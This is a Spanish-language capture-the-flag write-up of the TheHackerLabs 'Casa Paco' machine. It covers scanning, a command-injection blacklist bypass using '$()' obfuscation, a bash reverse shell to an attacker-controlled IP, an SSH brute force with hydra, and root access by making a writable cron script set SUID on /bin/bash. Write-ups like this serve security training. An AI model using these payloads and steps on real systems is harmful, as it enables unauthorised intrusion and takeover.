---
title: "Casa Paco - TheHackerLabs"
date: 2025-08-06
draft: false
slug: "THL-writeup-casaPaco"
excerpt: "Esta fue una máquina fácil. Después de analizar los escaneos, vemos que la página web activa en el puerto 80 tiene un dominio, es decir, está aplicando virtual hosting, por lo que lo registramos en el /etc/hosts para poder ver bien la página web. Analizando dicha página, descubrimos que es posible ejecutar comandos, pero también descubrimos que hay ciertos comandos que están siendo bloqueados, pues resulta que están dentro de una lista negra (blacklist). Logramos aplicar un bypass e identificamos una página igual a la que tiene las restricciones, pero sin estas, siendo que permite ejecutar cualquier comando. Aprovechamos dicha página para mandarnos una Reverse Shell, ganando acceso principal a la máquina víctima. Dentro, encontramos un usuario y en su directorio, vemos un script que parece ser una tarea CRON. Al no tener los comandos curl ni wget para poder cargar la herramienta pspy64 a la máquina víctima, decidimos aplicar fuerza bruta al usuario encontrado, logrando obtener su contraseña y así pudimos cargar pspy64 con el comando scp vía SSH. Autenticándonos con el usuario encontrado, ejecutamos pspy64, descubriendo que el script se ejecuta cada minuto y por el Root. Modificamos dicho script para que le dé permisos SUID a la Bash, esperamos 1 minuto y vemos que se le dan dichos permisos, logrando escalar privilegios, convirtiéndonos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Virtual Hosting", "BurpSuite", "Bypassing Command Blacklist", "Command Injection (CI)", "System Recognition (Linux)", "Brute Force Attack", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "BurpSuite"
  - "whoami"
  - "cat"
  - "ls"
  - "nc"
  - "bash"
  - "grep"
  - "hydra"
  - "ssh"
  - "scp"
  - "chmod"
links:
  - "https://techbrunch.github.io/patt-mkdocs/Command%20Injection/#filter-bypasses"
  - "https://hacktricks.boitatech.com.br/linux-unix/useful-linux-commands/bypass-bash-restrictions"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
  - "https://portswigger.net/web-security/os-command-injection"
  - "https://github.com/DominicBreuker/pspy"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-casaPaco/casa_paco.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.20
PING 192.168.100.20 (192.168.100.20) 56(84) bytes of data.
64 bytes from 192.168.100.20: icmp_seq=1 ttl=64 time=8.99 ms
64 bytes from 192.168.100.20: icmp_seq=2 ttl=64 time=1.12 ms
64 bytes from 192.168.100.20: icmp_seq=3 ttl=64 time=1.28 ms
64 bytes from 192.168.100.20: icmp_seq=4 ttl=64 time=0.787 ms

--- 192.168.100.20 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3031ms
rtt min/avg/max/mdev = 0.787/3.041/8.985/3.436 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.20 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 11:35 CST
Initiating ARP Ping Scan at 11:35
Scanning 192.168.100.20 [1 port]
Completed ARP Ping Scan at 11:35, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:35
Scanning 192.168.100.20 [65535 ports]
Discovered open port 22/tcp on 192.168.100.20
Discovered open port 80/tcp on 192.168.100.20
Completed SYN Stealth Scan at 11:36, 35.28s elapsed (65535 total ports)
Nmap scan report for 192.168.100.20
Host is up, received arp-response (0.0071s latency).
Scanned at 2025-08-06 11:35:29 CST for 36s
Not shown: 53043 filtered tcp ports (no-response), 12490 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.56 seconds
           Raw packets sent: 124832 (5.493MB) | Rcvd: 12495 (499.804KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay 2 puertos abiertos, supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.20 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 11:36 CST
Nmap scan report for 192.168.100.20
Host is up (0.00098s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)

| ssh-hostkey: 
|   256 72:58:87:c5:87:63:3f:fa:43:da:ed:69:2f:ed:a7:d0 (ECDSA)
|_  256 13:31:bc:26:a0:2e:4a:ae:b8:31:75:7f:0e:17:32:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.62

|_http-title: Did not follow redirect to http://casapaco.thl
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo, vemos que hay un dominio al que nos redirigen si queremos entrar a la página web.

Añade ese dominio al `/etc/hosts`:
```bash
echo "192.168.100.20 casapaco.thl" >> /etc/hosts
```
Bien, ya podemos visitar la página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura1.png">
</p>

Parece una página de un restaurante.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura2.png">
</p>

No hay mucho que destacar.

Si vamos al final de la página, vemos un botón que nos lleva a otra página web:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura3.png">
</p>

Es un menú con distintos platillos:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura4.png">
</p>

Y si nos vamos hasta abajo, igual veremos un botón que nos lleva a otra página:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura5.png">
</p>

Dicha página es para ordenar los platillos:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura6.png">
</p>

Probemos la funcionalidad de esta página, ordenando el ejemplo que menciona:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura7.png">
</p>

Analizando el resulta, es extraño que mencione salida de comando.

¿La página estará ejecutando comandos?

Usemos el comando **whoami** para comprobarlo:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura8.png">
</p>

Nos sale una advertencia de que no intentemos hackear la página web.

Intentemos ejecutar otro comando como el comando **id**:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura9.png">
</p>

Funciona, entonces, si está ejecutando comandos.

El problema es que si tratamos de listar los archivos con el comando **ls** o intentamos ver el archivo actual de la página con **cat**, no funcionará, lo que me hace pensar que hay comandos que están siendo bloqueados.

Vamos a hacer algunas pruebas para intentar inyectar comandos en esta página, así que captura este formulario con **BurpSuite** y manda la petición al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura10.png">
</p>

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Bypass a Lista Negra (Blacklist) de Comandos y Aplicando Inyección de Comandos {#Bypass}

Como mencioné antes, parece que hay comandos que están siendo bloqueados que, seguramente, están dentro de una **lista negra (blacklist)** de comandos para que no se ejecuten.

| **Lista Negra (Blacklist) de Comandos** |
| :-------------------------------------: |
| *Una blacklist de comandos (o "lista negra") es una técnica de seguridad o filtrado que bloquea expresamente ciertos comandos, palabras o patrones peligrosos para evitar que un atacante los use. Se utiliza en aplicaciones web, especialmente cuando hay interacción con el sistema operativo (como shell_exec() en PHP), una blacklist intenta prevenir ataques como inyecciones de comandos.* |

La idea es poder aplicar un bypass a esta lista que, hasta el momento, sabemos que no permite ejecutar los comandos:
* *whoami*
* *ls*
* *cat*

No sabemos que otros comandos están en la lista negra, pero usemos estos para aplicar un bypass y poder ejecutar cualquier comando.

Investigando un poco algunos wordlists, encontré el siguiente blog que es una joya:
* <a href="https://techbrunch.github.io/patt-mkdocs/Command%20Injection/#bypass-blacklisted-words" target="_blank">Payloads All The Things: Command Injections - Bypass Blacklisted words </a>

Ahí tenemos algunas formas que podemos usar para intentar ejecutar comandos bloqueados, pues lo que haremos será ofuscar los comandos con distintos caracteres agregados entre cada letra del comando a ejecutar.

Esto funciona porque las shells de **Linux y Windows** pueden ignorar ciertos caracteres y ejecutar un comando.

En el caso de **Linux**, estos son algunos caracteres que pueden servir:
```bash
'   # comilla simple
"   # comilla doble
\   # barra invertida
/   # barra
$@  # parámetro posicional
$() # sustitución de comandos
```

Y los pondríamos de esta manera:
```bash
w'h'o'am'i
w"h"o"am"i
w\ho\am\i
who$@ami
who$()ami
```
Estos mismos los encuentras en el blog.

El problema aquí es que es posible que dichos caracteres también estén dentro de una lista negra para que no puedan ser usados. Entonces, toca probar cada uno para ver cuál funciona.

Y de los probados, la **sustitución de comandos** `$()`, es la que funciona:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura11.png">
</p>

De esta forma, ya podemos ejecutar el comando que queramos.

Otra opción que pudimos haber hecho, sería usar comandos similares que nos permitan listar archivos, ver su contenido, etc. Por ejemplo, comandos como **more**, **less**, **strings** para ver el contenido de un archivo o **find**, **tree** para listar archivos.

Ahora, vamos a leer el archivo/script actual de la página para ver cómo hicieron la lista negra. 

Solo agrégale la **sustitución de comandos** al comando **cat**:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura12.png">
</p>

Resulta que se están aplicando varios filtros:
* **1.** El parámetro **name** está siendo filtrado para que no se pueda ejecutar un **ataque XSS**.
* **2.** La lista negra contiene los comandos **whoami, ls, pwd, cat, sh y bash**.
* **3.** Hay una **lista blanca (Whitelist)** de caracteres que permite únicamente el uso de los siguientes: `$`, `()`, `-`, `_`, espacios, números y letras (minúsculas y mayúsculas). Osea que cualquier otro caracter como `;`, `&`, `>`, `<`, `:`, `{}` y otros, no se pueden usar.
* **4.** Y al final vemos que se usa la funcion `shell_exec()` para ejecutar los comandos.

La lista blanca es más complicada de evitar, por lo que tenemos que buscar otra forma de abusar de esta **inyección de comandos**.

Usemos el comando **ls** para listar los archivos del directorio web actual:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura13.png">
</p>

Observa que hay otro script llamado **llevar1.php**.

Veamos su contenido:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura14.png">
</p>

Parece ser el mismo script que el actual, pero sin las restricciones de la lista negra y la lista blanca.

### Abusando de Página Sin Restricciones de Comandos para Obtener Reverse Shell {#revShell}

Para usar la página **llevar1.php**, solamente tenemos que agregarle el 1 en la **petición POST** y ya podremos ejecutar cualquier comando:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura15.png">
</p>

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell** (recuerda **URL encodear** el comando):
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Y ejecútala:

<p align="center">
<img src="/assets/images/THL-writeup-casaPaco/Captura16.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.20] 51358
bash: cannot set terminal process group (506): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Thehackerslabs-CasaPaco:/var/www/html$ whoami
whoami
www-data
```

Ya solo obtengamos la sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de Máquina Linux y Aplicando Fuerza Bruta a Usuario pacogerente {#linEnum}

Veamos qué usuarios existen en la máquina víctima:
```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
pacogerente:x:1001:1001::/home/pacogerente:/bin/bash
```
Tenemos un usuario llamado **pacogerente**.

Podemos ver el contenido de su directorio en la ruta `/home`:
```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root        root        4096 Jan 14  2025 .
drwxr-xr-x 18 root        root        4096 Jan 13  2025 ..
drwxr-xr-x  3 pacogerente pacogerente 4096 Aug  7 00:29 pacogerente
```

Movámonos ahí y veamos su contenido:
```bash
www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/pacogerente/
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -la
total 52
drwxr-xr-x 3 pacogerente pacogerente  4096 Aug  7 00:36 .
drwxr-xr-x 3 root        root         4096 Jan 14  2025 ..
lrwxrwxrwx 1 root        root            9 Jan 14  2025 .bash_history -> /dev/null
-rw-r--r-- 1 pacogerente pacogerente   220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pacogerente pacogerente  3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 pacogerente pacogerente  4096 Jan 13  2025 .local
-rw-r--r-- 1 pacogerente pacogerente   807 Mar 29  2024 .profile
-rwxrw-rw- 1 pacogerente pacogerente   110 Ene  4 00:33 fabada.sh
-rw-r--r-- 1 root        root        17579 Aug  7 00:36 log.txt
-rw-r--r-- 1 pacogerente pacogerente    33 Jan 14  2025 user.txt
```

Muy bien, podemos ver la flag del usuario:
```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat user.txt
...
```

Y ahí vemos un script que podemos leer y modificar, pero primero veamos su contenido:
```bash
www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
#!/bin/bash

# Generar un log de actividad
echo "Ejecutado por cron el: $(date)" >> /home/pacogerente/log.txt
```
Entiendo que este script sirve como una **tarea CRON** que ejecuta el comando **date**, que nos da la fecha actual, y el resultado lo mete en un archivo de texto llamado **log.txt**.

Podríamos usar la herramienta **pspy64** para ver quién y en cuánto tiempo se ejecuta la **tarea CRON**, pero no tenemos las herramientas **wget y curl** para cargarlo a la máquina víctima.

Nuestra única opción es usar **scp**, pero no tenemos la contraseña del **usuario pacogerente** para entrar vía **SSH** a la máquina víctima.

Intentemos aplicar fuerza bruta al **servicio SSH** usando el **usuario pacogerente** y la herramienta **hydra**:
```bash
hydra -l 'pacogerente' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-06 15:11:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.20:22/
[STATUS] 603.00 tries/min, 603 tries in 00:01h, 14343828 to do in 396:28h, 32 active
[STATUS] 599.00 tries/min, 1797 tries in 00:03h, 14342634 to do in 399:05h, 32 active
[22][ssh] host: 192.168.100.20   login: pacogerente   password: *****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 27 final worker threads did not complete until end.
[ERROR] 27 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-06 15:18:18
```
Tardo un poco, pero tenemos la contraseña.

Probémosla:
```bash
ssh pacogerente@192.168.100.20
pacogerente@192.168.100.20's password: 
Linux Thehackerslabs-CasaPaco 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
...
Last login: Tue Jan 14 16:48:33 2025
pacogerente@Thehackerslabs-CasaPaco:~$ whoami
pacogerente
```
Estamos dentro.

Ya podemos copiar la herramienta **pspy64**.

### Modificando Tarea CRON para Asignar Permisos SUID a la Bash y Podamos Escalar Privilegios {#CRON}

Aquí puedes encontrar la herramienta **pspy64**:
* <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy64</a>

Una vez que lo descargues, cárgalo a la máquina víctima con **scp**.

Sal de tu sesión de **SSH** y ejecuta el siguiente comando:
```bash
scp pspy64 pacogerente@192.168.100.20:/home/pacogerente/
pacogerente@192.168.100.20's password: 
pspy64
```

Vuelve a entrar y ejecuta **pspy64**:
```bash
pacogerente@Thehackerslabs-CasaPaco:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░
...
2025/08/06 23:41:10 CMD: UID=0     PID=1      | /sbin/init 
2025/08/06 23:42:01 CMD: UID=0     PID=4467   | /bin/sh -c /home/pacogerente/fabada.sh 
2025/08/06 23:42:01 CMD: UID=0     PID=4466   | /usr/sbin/CRON -f 
2025/08/06 23:42:01 CMD: UID=0     PID=4468   | /bin/sh -c /home/pacogerente/fabada.sh 
2025/08/06 23:42:01 CMD: UID=0     PID=4469   | /bin/bash /home/pacogerente/fabada.sh
2025/08/06 23:43:01 CMD: UID=0     PID=4471   | /bin/sh -c /home/pacogerente/fabada.sh 
2025/08/06 23:43:01 CMD: UID=0     PID=4470   | /usr/sbin/CRON -f 
2025/08/06 23:43:01 CMD: UID=0     PID=4472   | /bin/bash /home/pacogerente/fabada.sh 
2025/08/06 23:43:01 CMD: UID=0     PID=4473   | /bin/bash /home/pacogerente/fabada.sh 
```
Excelente, el script **fabada.sh** se ejecuta cada minuto y por el **Root**.

Y como podemos modificarlo, vamos a indicarle al script que le dé **permisos SUID** a la **Bash** para escalar privilegios.

Revisa los permisos de la **Bash**:
```bash
pacogerente@Thehackerslabs-CasaPaco:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
```
Son normales, como deberían ser.

Modifiquemos el script para que le dé los **permisos SUID**:
```bash
nano fabada.sh
--------------
chmod u+s /bin/bash
```
Listo.

Espera un minuto y vuelve a revisar los permisos de la **Bash**:
```bash
pacogerente@Thehackerslabs-CasaPaco:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
```

Ya podemos ejecutar la **Bash** con privilegios:
```bash
pacogerente@Thehackerslabs-CasaPaco:~$ bash -p
bash-5.2# whoami
root
```

Obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
